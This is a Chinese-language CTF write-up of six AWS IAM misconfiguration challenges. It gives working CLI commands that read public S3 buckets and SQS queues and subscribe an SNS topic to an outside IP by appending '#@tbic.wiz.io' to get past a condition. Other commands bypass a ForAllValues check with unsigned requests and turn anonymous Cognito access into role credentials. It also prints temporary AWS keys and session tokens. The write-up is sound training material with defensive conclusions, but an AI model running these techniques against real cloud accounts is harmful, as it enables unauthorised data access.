# WIZ-IAM-Writeup

## Challenge1

IAM的policy：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

可列可读存储桶thebigiamchallenge-storage-9979f4b，直接访问即可：

https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt

## Challenge2

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

给了所有人发送和接收SQS消息的权限。

查阅官方文档，接收消息：

```bash
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

{
    "Messages": [
        {
            "MessageId": "c3a56c79-2123-4801-b3bb-2a82944ecef0",
            "ReceiptHandle": "AQEBicJ7LTol9i3xDuPgoCjBG3NRSBPb9vecTviW8el3YFEdJ9BoJl+H3KZ8rybXR614CbzS51ecnerRI3rpAFc0G7PwWcgy+5Fbtqfnx8G
orrSKUbbxDO0CEZwyykzt8NRuYMKVlNMpwzSatqyVJ6ZH1YpoaBN2UZpxpX3XfPASw2k0QvRPvMejGC58mhOIcru3ok4myuUSpnzWXZ5ZE5douYr5HJQjGC81XjHRroK8kzFfBJl0
FHhm/Rw19AASgaOfhX/re0uJoScazZ1wFN/uiCkl/0VNXzUwRTKhDoeQPs/P+r5dwNaCmLrFysIIbbx1JZmDWT7e86IYnJWEc1QTqE7V5zeJUpyhDXSRLSd/RBlqd8Lda+RMx5iI1
yzcQntLM8NiFT0kzsyq+Wjq3BubhmCW8BOy6nPKWMQPeeA9ct4=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5
329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```

访问https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html即可得到flag。

## Challenge3

```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```



sns服务即Amazon Simple Notification Service。

policy给了所有人订阅sns服务的权限，但是有个condition。

查一下文档发现订阅还需要确认，但是用http协议拿nc监听没法确认，但是官方文档写了：

> Subscribes an endpoint to an Amazon SNS topic. If the endpoint type is HTTP/S or email, or if the endpoint and the topic are not in the same Amazon Web Services account, the endpoint owner must run the ConfirmSubscription action to confirm the subscription.
>
> You call the ConfirmSubscription action with the token from the subscription response. Confirmation tokens are valid for three days.

需要运行ConfirmSubscription来确认订阅，带上token即可：

```bash
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://121.5.169.223:39567/#@tbic.wiz.io

aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token 2336412f37fb687f5d51e6e2425c464cefc6032f687b6a11a4bc229ee6e124b0bad60c07de8c174a2ac976a6885ba4698cc4ca1dfcf1ef316427197269f43587bad8586f54f90ae09600dd7cb2e5464ad5afaa4c8332ed0fa1582f8f46f4f9fb86ce328a3c8a4664273752c33ae6431bcb1d085c10a12c72a05654de06168c5f --endpoint-url http://121.5.169.223:39567/#@tbic.wiz.io
```

过一段时间即可收到flag。

## Challenge4

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```



`ForAllValues`有一个漏洞：

> Use caution if you use `ForAllValues` with an `Allow` effect because it can be overly permissive if the presence of missing context keys or context keys with empty values in the request context is unexpected. You can include the `Null` condition operator in your policy with a false value to check if the context key exists and its value is not null.

如果请求中的每个上下文键值与策略中的至少一个上下文键值匹配，则该条件返回 true。如果请求中没有上下文键，或者上下文键值解析为空数据集（例如空字符串），它也会返回 true。

让上下文键值解析为空，利用`--no-sign-request`即可。

```bash
aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --no-sign-request --prefix 'files/'
```

访问https://thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com/files/flag-as-admin.txt

## Challenge5

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

允许访问`wiz-privatefiles`下面的东西但是需要经过cognito认证。

AWS Cognito 是一项托管服务，可帮助开发人员轻松添加用户身份验证和授权功能到应用程序中。它提供了用于注册、登录和管理用户的功能，支持常见的身份验证方法，如用户名/密码、社交媒体登录和身份提供商集成。Cognito 还提供了用户身份验证的安全性、可伸缩性和可定制性，并与其他 AWS 服务集成，使开发人员能够构建安全可靠的应用程序。

那么这里需要先了解下，如何使用 Cognito，根据官方文档的描述，要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。



```bash
#从f12中得到身份池id
#IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"


#先拿到IdentityId
aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:631f8297-674c-4a53-be2d-729ca8cdc6fd"
}

#利用IdentityId获取Credentials
aws cognito-identity get-credentials-for-identity --identity-id us-east-1:631f8297-674c-4a53-be2d-729ca8cdc6fd
{
    "IdentityId": "us-east-1:631f8297-674c-4a53-be2d-729ca8cdc6fd",
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXMJO4KDED",
        "SecretKey": "BLFs+V9nm/H6XWhddq3e5TwyvW7NnV3QTgYp9Hvy",
        "SessionToken": "IQoJb3JpZ2luX2VjEKH//////////wEaCXVzLWVhc3QtMSJHMEUCIQDoOwUG57KzjcOdVgF/5xii3HEW6liTQLKewpXAbwGmHwIgSZ4tsZwrlEr+
VWyQ1zZAe7K+uOBL0urOkJPUhtTGOyMq0QUIuf//////////ARAAGgwwOTIyOTc4NTEzNzQiDOPgvb4TDS1u51+1RSqlBUaXJoMvJWdK5ucXIpFAf2u75v6xm8CJv3UQw/81BosnC
zbun//Q4PBc6mFC5QkM7C7l/5trvesQj3fNMay/J7xoP6pSrOe2brSsZI5680hwnk9QZMdzBVNb7Xcq8Q465iQl0SiAYbrFFN/+l7FR5bOH8Qj5vOoyAMug2lwHOtq7RMxs8wi8cN
w8Xmcv22NNNfr5rcpuXhqgLzDH3R7ZPuzaVZSsF9pAdJKwZiYKwMFj0pkT8VyBoqC4dNzBo/mL8bn5cxWgJHQkcxzJr+0hV9MXsn9bNYwLy46yW6mCkF6USeG4QF46YwXa4AVKzMS
Arr808FMyZRHHvMkTbzHisSnBiEYIf5AFGbhF7C0EWJwqyZw0VQQUW/f+1Riq5WGtvKrswqByf4k1FQArV3Sm4ENgXwOp6UhrkldzXL9yXGAMxvy33Fpw+urPB6ONXv0/KTGJr69C
UYt4BP7Z+mFFwmFvoroyqucs9uiR1VpMy9acfsLoA1QaklG1LYHT+H97IqwhUb0YjfpyP432mpm8Bshy7T1zI+4SZaiCmmHhsqUe0kTg2ohPxv+mMmGuxixav3Ij1SD7gmMo7ROE4
kN6H3V5jax/NqUoQAgTiyBUDs/8Atf3Hu4P4Y+iREEdtT+a/OYMn7CGpxVIC6aSkFUU0gRT2rM2PJvF3FRRaMQRylK35HhnkdVTk0W72dzBYloathulDYWc9GupKrIzf2wBQy2eGY
rbaSyHI/JOhAab6GtiRvP/cSjd2fheooK4xS/nGbfxUrdI20QWLy8zRr+D7YlToM2rv3ltBKFcpWEXw8hFRbyjYl4WuOH7/+c/FSY+TqxO9YxFlX7STG3gGB6dvLN4eIclq9q6am0
bgnSFIR4BU0MY2o+lX3aibCqf4jxy4vG7DSpYMOvNw6kGOt4CzXWecru8NbcrivLBCg7XY+CD2muv4N25/dPfX6ryKgbSZI8B9SgU4I51Ubu0zIC3WoS1gdbJgASFw/71Nwijyisx
ft+xQ2NkmtT5RnzDp7nOFlvJgpJsk/tkv5IE/mVO9xZ6ZWWwEYHcN5Oh9hIrQ6rM7ufR6gHHg4844BKg+BkCTpnT5itBRg4+FFsERq1iEs9ChHAb+gjraBLuMOZnT9CzdT3sIzlFu
umiSgvqQt1ZqEP4RUQF5UZJzjpp/ThRwVp3flpRNzWKtXqAznSm8K98mUoLrtI8KvZjgGJOT9aars6SvWL4kau1O/ryAe/Cubq9+bd6tTsn/WyCOd+JBLVxbdF2J7MBe6uCz2Fe3L
7jCb56V0g53nzb7lcgVu3vA5wWKQvlczuYuLAYcQyhqzIKYPy2PQeT6IS79G7YqX5PBjLrKGRu4L25b00GCzk1RXuqJvZDNqjXPrB6boI=",
        "Expiration": 1697707259.0
    }
}



#需要连aws_session_token也配上
aws configure set aws_access_key_id ASIARK7LBOHXMJO4KDED
aws configure set aws_secret_access_key BLFs+V9nm/H6XWhddq3e5TwyvW7NnV3QTgYp9Hvy
aws configure set aws_session_token IQoJb3JpZ2luX2VjEKH//////////wEaCXVzLWVhc3QtMSJHMEUCIQDoOwUG57KzjcOdVgF/5xii3HEW6liTQLKewpXAbwGmHwIgSZ4tsZwrlEr+VWyQ1zZAe7K+uOBL0urOkJPUhtTGOyMq0QUIuf//////////ARAAGgwwOTIyOTc4NTEzNzQiDOPgvb4TDS1u51+1RSqlBUaXJoMvJWdK5ucXIpFAf2u75v6xm8CJv3UQw/81BosnCzbun//Q4PBc6mFC5QkM7C7l/5trvesQj3fNMay/J7xoP6pSrOe2brSsZI5680hwnk9QZMdzBVNb7Xcq8Q465iQl0SiAYbrFFN/+l7FR5bOH8Qj5vOoyAMug2lwHOtq7RMxs8wi8cNw8Xmcv22NNNfr5rcpuXhqgLzDH3R7ZPuzaVZSsF9pAdJKwZiYKwMFj0pkT8VyBoqC4dNzBo/mL8bn5cxWgJHQkcxzJr+0hV9MXsn9bNYwLy46yW6mCkF6USeG4QF46YwXa4AVKzMSArr808FMyZRHHvMkTbzHisSnBiEYIf5AFGbhF7C0EWJwqyZw0VQQUW/f+1Riq5WGtvKrswqByf4k1FQArV3Sm4ENgXwOp6UhrkldzXL9yXGAMxvy33Fpw+urPB6ONXv0/KTGJr69CUYt4BP7Z+mFFwmFvoroyqucs9uiR1VpMy9acfsLoA1QaklG1LYHT+H97IqwhUb0YjfpyP432mpm8Bshy7T1zI+4SZaiCmmHhsqUe0kTg2ohPxv+mMmGuxixav3Ij1SD7gmMo7ROE4kN6H3V5jax/NqUoQAgTiyBUDs/8Atf3Hu4P4Y+iREEdtT+a/OYMn7CGpxVIC6aSkFUU0gRT2rM2PJvF3FRRaMQRylK35HhnkdVTk0W72dzBYloathulDYWc9GupKrIzf2wBQy2eGYrbaSyHI/JOhAab6GtiRvP/cSjd2fheooK4xS/nGbfxUrdI20QWLy8zRr+D7YlToM2rv3ltBKFcpWEXw8hFRbyjYl4WuOH7/+c/FSY+TqxO9YxFlX7STG3gGB6dvLN4eIclq9q6am0bgnSFIR4BU0MY2o+lX3aibCqf4jxy4vG7DSpYMOvNw6kGOt4CzXWecru8NbcrivLBCg7XY+CD2muv4N25/dPfX6ryKgbSZI8B9SgU4I51Ubu0zIC3WoS1gdbJgASFw/71Nwijyisxft+xQ2NkmtT5RnzDp7nOFlvJgpJsk/tkv5IE/mVO9xZ6ZWWwEYHcN5Oh9hIrQ6rM7ufR6gHHg4844BKg+BkCTpnT5itBRg4+FFsERq1iEs9ChHAb+gjraBLuMOZnT9CzdT3sIzlFuumiSgvqQt1ZqEP4RUQF5UZJzjpp/ThRwVp3flpRNzWKtXqAznSm8K98mUoLrtI8KvZjgGJOT9aars6SvWL4kau1O/ryAe/Cubq9+bd6tTsn/WyCOd+JBLVxbdF2J7MBe6uCz2Fe3L7jCb56V0g53nzb7lcgVu3vA5wWKQvlczuYuLAYcQyhqzIKYPy2PQeT6IS79G7YqX5PBjLrKGRu4L25b00GCzk1RXuqJvZDNqjXPrB6boI=


aws s3 ls s3://wiz-privatefiles
aws s3 cp s3://wiz-privatefiles/flag1.txt flag1.txt
```





或者用html：

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cognito JavaScript SDK Example</title>
    <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>
<body>
    <script>
        // 初始化AWS SDK配置
        AWS.config.region = 'us-east-1';
        AWS.config.credentials = new AWS.CognitoIdentityCredentials({
            IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
        });
        // 获取临时凭证
        AWS.config.credentials.get(function(err) {
            if (!err) {
                // 凭证获取成功
                var accessKeyId = AWS.config.credentials.accessKeyId;
                var secretAccessKey = AWS.config.credentials.secretAccessKey;
                var sessionToken = AWS.config.credentials.sessionToken;

                // 进行后续操作，如访问S3
                accessS3(accessKeyId, secretAccessKey, sessionToken);
            } else {
                // 凭证获取失败
                console.error('Error retrieving credentials: ' + err);
            }
        });
        // 使用临时凭证访问S3
        function accessS3(accessKeyId, secretAccessKey, sessionToken) {
            var s3 = new AWS.S3({
                accessKeyId: accessKeyId,
                secretAccessKey: secretAccessKey,
                sessionToken: sessionToken,
            });
            var params = {
                Bucket: 'wiz-privatefiles',
            };
            s3.getSignedUrl('listObjectsV2', params, function(err, data) {
                if (!err) {
                    // S3存储桶列表获取成功
                    console.log(data);
                } else {
                    // S3存储桶列表获取失败
                    console.error('Error listing S3 buckets: ' + err);
                }
            });
        }
    </script>
</body>
</html>
```

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cognito JavaScript SDK Example</title>
    <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>
<body>
    <script>
        // 初始化AWS SDK配置
        AWS.config.region = 'us-east-1';
        AWS.config.credentials = new AWS.CognitoIdentityCredentials({
            IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
        });
        // 获取临时凭证
        AWS.config.credentials.get(function(err) {
            if (!err) {
                // 凭证获取成功
                var accessKeyId = AWS.config.credentials.accessKeyId;
                var secretAccessKey = AWS.config.credentials.secretAccessKey;
                var sessionToken = AWS.config.credentials.sessionToken;

                // 进行后续操作，如访问S3
                accessS3(accessKeyId, secretAccessKey, sessionToken);
            } else {
                // 凭证获取失败
                console.error('Error retrieving credentials: ' + err);
            }
        });
        // 使用临时凭证访问S3
        function accessS3(accessKeyId, secretAccessKey, sessionToken) {
            var s3 = new AWS.S3({
                accessKeyId: accessKeyId,
                secretAccessKey: secretAccessKey,
                sessionToken: sessionToken,
            });
            var params = {
                Bucket: 'wiz-privatefiles',
                Key: 'flag1.txt',
            };
            s3.getSignedUrl('getObject', params, function(err, data) {
                if (!err) {
                    // S3存储桶对象获取成功
                    console.log(data);
                } else {
                    // S3存储桶对象获取失败
                    console.error('Error get S3 bucket object: ' + err);
                }
            });
        }
    </script>
</body>
</html>
```





**平时应该保护好自己的身份池 ID，另外身份池类型有不允许匿名访问和允许匿名访问这两种，在创建身份池的时候，我们应该选择使用不允许匿名访问的。**



## Challenge6

```bash
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```



要利用AssumeRoleWithWebIdentity行为要生成STS变成一个高权限用户。

```bash
aws sts assume-role-with-web-identity help

--role-arn <value>
--role-session-name <value>
--web-identity-token <value>

```

第一个给了，第二个是自己定义的，需要获得的是第三个。

第三个查一下就知道通过`get-open-id-token`获取，而这个需要用到`--identity-id`，拿`get-id`获取即可：

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:5ff1c08b-f571-4de9-b599-cfe96ea0dffc"
}

aws cognito-identity get-open-id-token --identity-id us-east-1:5ff1c08b-f571-4de9-b599-cfe96ea0dffc
{
    "IdentityId": "us-east-1:5ff1c08b-f571-4de9-b599-cfe96ea0dffc",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6NWZmMWMwOGItZjU3MS00ZGU5LWI1OTktY2Zl
OTZlYTBkZmZjIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0c
HM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2OTc3MDkwODcsImlhdCI6MTY5NzcwODQ4N30.Vc895kgqvWCdiV-FmBjk1Thhvl1Ynjib5DanlPuL7O
pfWhB0GHkzNm_6tVcb3Td2cMQzraxYGJa-5Kr-iu2iZrPxbsEkAeC4ODPvZF4CQ9HvgdQkcPZxcO2Ui2YollES2kTRf4SUWxXLEceyhyYyWoOfdG7yDdRMkrPKyf6RtrEd3SiiGj6
osPj4kNnsmO7fVZN2Pw07uQ7q2QH8Q9c0etL9-oSweb5-vpYDpl0PNSfzsBcNoIA6xazhXM_KxULJ0eiOvAoMnSqRR1rlXfd_KXkpLrx1jrvOkihRwuNMMOBLpah4FI6MfJEe4PWy
Tq5rVAFJ8TIO0h3PEv2nQKcuLg"
}


aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --web-identity-token "eyJraWQ
iOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6NWZmMWMwOGItZjU3MS00ZGU5LWI1OTktY2ZlOTZlYTBkZmZjIiwiYXVkI
joidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW
50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2OTc3MDkwODcsImlhdCI6MTY5NzcwODQ4N30.Vc895kgqvWCdiV-FmBjk1Thhvl1Ynjib5DanlPuL7OpfWhB0GHkzNm_6tVcb3Td
2cMQzraxYGJa-5Kr-iu2iZrPxbsEkAeC4ODPvZF4CQ9HvgdQkcPZxcO2Ui2YollES2kTRf4SUWxXLEceyhyYyWoOfdG7yDdRMkrPKyf6RtrEd3SiiGj6osPj4kNnsmO7fVZN2Pw07
uQ7q2QH8Q9c0etL9-oSweb5-vpYDpl0PNSfzsBcNoIA6xazhXM_KxULJ0eiOvAoMnSqRR1rlXfd_KXkpLrx1jrvOkihRwuNMMOBLpah4FI6MfJEe4PWyTq5rVAFJ8TIO0h3PEv2nQ
KcuLg" --role-session-name feng
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXEIBQYDWT",
        "SecretAccessKey": "p1dJWQhuWxQBYa9Zpj2tefqLs3pYXf/1AfRnsIVo",
        "SessionToken": "FwoGZXIvYXdzELP//////////wEaDMSr9OESzDMOBS/bJCKcAjubmvIja2NuNyoJKH7+1YpYMtLZS9IFumt5GhYuwxgFkTqyKYk1KlV012QXvUze
QiniB/wy1EdjJ2JDE8yOpfPWpwb2qjYWUqE2jJpZxx2GXoFXTnKpq6SPylrQkQ3solIgJVUOG0q+xAETxxPGlrocMjSIQZaizOe2HpJ+30NcQnBr0Xzqrik1+UD/VsY5T3rrdbFPw
hjvM2YYYAY39pdHJQYmzqDpVlP1Fzwe7q/RIwXbsGY5gIBEj2ZHr5XhPH4q1E8dlIcWGbqdKuluP3/ZLbTX8cddt5ZtNoqtpHMULhxFao7IwaUUobWKI/4+WMEDW/A45UJxi3UjtB
gVxln/l+6lcRuQsZS1j5NU6KE3A44N3Nw292rO3Dg3KKT1w6kGMpYBS4Bwu8trX6TrnD26KM5oHtGJ98iUyTrgbUqNgAcPoBRulUs6OJUbyIZn1JFVzbyKCjcDVU5MXGEwtvUQdlQ
nTI+3CnzOWcla9dWqHH9qbf5UvMSr4wja/o+3pCYK5iqKrLB65NIhoCcQKd0cAkQBrZ0HWrtc7fLW0i9U4bTP2CW+8DI67Kt2sVVwN7h9Adb/+Q2QEAHD",
        "Expiration": "2023-10-19T10:45:08Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:5ff1c08b-f571-4de9-b599-cfe96ea0dffc",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:feng",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/feng"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```

将得到的配置好：

```bash
aws configure set aws_access_key_id xxx
aws configure set aws_secret_access_key xxx
aws configure set aws_session_token xxx
```

之后列一下存储桶：

```bash
aws s3api list-buckets

{
    "Buckets": [
        {
            "Name": "tbic-wiz-analytics-bucket-b44867f",
            "CreationDate": "2023-06-04T17:07:29+00:00"
        },
        {
            "Name": "thebigiamchallenge-admin-storage-abf1321",
            "CreationDate": "2023-06-05T13:07:44+00:00"
        },
        {
            "Name": "thebigiamchallenge-storage-9979f4b",
            "CreationDate": "2023-06-04T16:31:02+00:00"
        },
        {
            "Name": "wiz-privatefiles",
            "CreationDate": "2023-06-05T13:28:31+00:00"
        },
        {
            "Name": "wiz-privatefiles-x1000",
            "CreationDate": "2023-06-05T13:28:31+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "shir+ctf",
        "ID": "37ec5af87b339325fbafa92e65fbd5f5ab4bcd7e733fa76838720554da48d3f9"
    }
}

```

发现`wiz-privatefiles-x1000`还没有访问过，拿flag就行：

```bash
aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt flag2.txt
```



这道题可以得到的结论：

**在拿到身份池 ID 以及所对应的角色 ARN 时，通过这两条信息，可以获取到对应角色的权限，因此平时应该注意，不要将这些信息泄露。**